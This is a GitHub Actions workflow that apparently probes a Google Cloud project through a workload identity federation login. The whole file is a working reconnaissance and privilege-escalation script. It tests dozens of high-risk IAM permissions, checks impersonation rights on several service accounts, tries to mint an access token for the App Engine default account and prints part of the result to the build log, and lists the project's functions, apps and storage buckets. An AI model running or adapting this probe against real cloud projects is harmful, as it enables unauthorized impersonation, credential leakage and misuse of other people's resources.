name: wif-probe3
on: push
permissions:
  contents: read
  id-token: write
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - id: auth
        uses: google-github-actions/auth@v1
        with:
          workload_identity_provider: projects/956073807168/locations/global/workloadIdentityPools/my-pool/providers/my-provider
          service_account: deploy-cloud-functions@nutmeg-9099c.iam.gserviceaccount.com
      - name: perms
        run: |
          T=$(gcloud auth print-access-token 2>/dev/null); echo "TOKLEN=${#T}"; P=nutmeg-9099c
          tip() { curl -s -X POST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d "$2" "$1"; echo; }
          echo "=== PERMS_PROJECT ==="
          tip "https://cloudresourcemanager.googleapis.com/v1/projects/$P:testIamPermissions" '{"permissions":["iam.serviceAccounts.getAccessToken","iam.serviceAccounts.signBlob","iam.serviceAccounts.signJwt","iam.serviceAccounts.getOpenIdToken","iam.serviceAccountKeys.create","iam.serviceAccounts.create","iam.serviceAccounts.delete","iam.serviceAccounts.setIamPolicy","iam.roles.list","resourcemanager.projects.getIamPolicy","resourcemanager.projects.setIamPolicy","serviceusage.services.enable","serviceusage.services.list","serviceusage.services.get","serviceusage.quotas.get","compute.instances.create","compute.instances.setMetadata","compute.instances.list","compute.instances.get","compute.disks.create","compute.networks.create","compute.projects.get","compute.zones.list","compute.acceleratorTypes.list","container.clusters.create","container.clusters.getCredentials","container.clusters.list","cloudfunctions.functions.create","cloudfunctions.functions.update","cloudfunctions.functions.list","cloudfunctions.functions.get","run.services.create","run.services.update","cloudbuild.builds.create","artifactregistry.repositories.create","storage.buckets.create","storage.buckets.list","storage.objects.create","aiplatform.customJobs.create","aiplatform.customJobs.list","aiplatform.endpoints.create","aiplatform.models.upload","aiplatform.pipelineJobs.create","tpu.nodes.create","tpu.nodes.list","deploymentmanager.deployments.create","secretmanager.secrets.create","secretmanager.versions.access","dataproc.clusters.create","dataflow.jobs.create","pubsub.topics.create","bigquery.datasets.create"]}'
          for sa in nutmeg-9099c@appspot.gserviceaccount.com 956073807168-compute@developer.gserviceaccount.com github-action-364918749@nutmeg-9099c.iam.gserviceaccount.com nutmeg-deploy@nutmeg-9099c.iam.gserviceaccount.com; do
            echo "=== SA $sa ==="
            tip "https://iam.googleapis.com/v1/projects/-/serviceAccounts/$sa:testIamPermissions" '{"permissions":["iam.serviceAccounts.actAs","iam.serviceAccounts.getAccessToken","iam.serviceAccounts.signBlob","iam.serviceAccountKeys.create"]}'
          done
          echo "=== GEN_APPSPOT ==="
          curl -s -o /tmp/g1 -w 'HTTP=%{http_code} ' -X POST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d '{"lifetime":"600s"}' "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/nutmeg-9099c@appspot.gserviceaccount.com:generateAccessToken"; head -c 160 /tmp/g1; echo
          echo "=== FUNCTIONS_LIST ==="
          curl -s -H "Authorization: Bearer $T" "https://cloudfunctions.googleapis.com/v1/projects/$P/locations/-/functions"; echo
          echo "=== GAE_APPS ==="
          curl -s -H "Authorization: Bearer $T" "https://appengine.googleapis.com/v1/apps/$P"; echo
          echo "=== STORAGE_BUCKETS ==="
          curl -s -H "Authorization: Bearer $T" "https://storage.googleapis.com/storage/v1/b?project=$P&maxResults=20"; echo
          echo "=== END ==="
